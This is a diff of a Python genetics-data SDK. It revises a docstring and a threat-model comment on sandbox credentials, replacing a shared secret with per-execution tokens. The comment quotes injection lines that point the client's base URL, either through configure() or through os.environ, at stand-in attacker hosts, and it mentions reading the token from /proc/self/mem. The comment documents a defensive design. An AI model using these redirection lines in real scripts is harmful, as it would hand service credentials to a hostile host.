@@ -5,11 +5,18 @@
     df = genetics.credible_sets(gene="IL7R")
     df.filter(pl.col("pip") > 0.5)
 
-A script needs no knowledge of HTTP, tokens, base URLs or result envelopes: endpoints and
-credentials come from the environment (GENETICS_API_URL, BIGQUERY_API_URL,
-INTERNAL_API_SECRET), every function returns a polars DataFrame, and a failed request
-raises GeneticsError instead of returning a success flag to check. Endpoints are read from
-the environment ONLY and cannot be set from a script — see the note above `_URL_SETTINGS`.
+A script needs no knowledge of HTTP, tokens, base URLs or result envelopes: endpoints come
+from the environment (GENETICS_API_URL, BIGQUERY_API_URL), every function returns a polars
+DataFrame, and a failed request raises GeneticsError instead of returning a success flag to
+check. Endpoints are not settable from a script — see the note above `_URL_SETTINGS`.
+
+In the sandbox the credential is the PER-EXECUTION token pair the supervisor minted for
+this execution and named to the child by path in SANDBOX_TOKEN_FILE, attached per request
+and bound to the destination it is going to — never INTERNAL_API_SECRET, which the sandbox
+image does not hold (genetics-results-suite-4h6.44; `tools/executor.py`'s
+`_load_sandbox_tokens` and `_SandboxTokenAuth`). Outside the sandbox — the service
+processes and local runs — the client still authenticates with INTERNAL_API_SECRET. The two
+are mutually exclusive with no fallback between them.
 
 Nothing here imports the chat backend, the MCP server or the databases, so the package can
 be installed into a sandbox image on its own.
@@ -65,18 +72,25 @@ _FUNCTIONS = (
 
 _client: GeneticsClient | None = None
 
-# a script may not redirect the client's endpoints. The client authenticates every request
-# with INTERNAL_API_SECRET, so a caller-supplied base URL turns one injected line —
+# endpoints are not a configuration surface: the client credentials every request to them,
+# so accepting a caller-supplied base URL would turn one injected line —
 #     genetics.configure(api_base_url="http://attacker.example/api")
 #     genetics.expression("APOE")
-# — into the shared secret that authenticates to BOTH results-api and db-api. URLs
-# therefore come from the environment only (GENETICS_API_URL, GENETICS_PUBLIC_API_URL,
-# BIGQUERY_API_URL), which the sandbox controls and the script does not.
+# — into a credential handed to that host. URLs are therefore read from the environment
+# (GENETICS_API_URL, GENETICS_PUBLIC_API_URL, BIGQUERY_API_URL).
 #
-# This is a MITIGATION, not the answer. Per genetics-results-suite
-# docs/code-execution-security.md, a script that can `import` the SDK can also read
-# os.environ, so the SDK must eventually carry a short-lived scoped token instead of
-# INTERNAL_API_SECRET at all — tasks genetics-results-suite-4h6.9 / .14.
+# THAT IS TIDINESS, NOT A BOUNDARY, and must not be cited as one. The sandbox child is
+# forked without exec, so the SCRIPT owns os.environ too: the reads are cached_property
+# reads on the executor performed at FIRST USE, and `_client` below stays None until the
+# first call, so `os.environ["GENETICS_API_URL"] = "http://evil.attacker.test/api"` ahead
+# of that first call redirects the client and takes the token with it — measured. Closing
+# this door only makes the obvious way harder than the environment variable, and the
+# environment variable is not the hardest way either: the same script can read the token
+# out of /proc/self/mem. What actually contains a hostile script is the sandbox's
+# deny-by-default egress allow-list plus genetics-results-suite-4h6.55; per
+# genetics-results-suite docs/code-execution-security.md, the value of the per-execution
+# token (4h6.44, now landed) is that it is short-lived, audience-scoped and ATTRIBUTABLE,
+# not that it is unreachable.
 _URL_SETTINGS = ("api_base_url", "public_api_url", "bigquery_api_url")
 
 
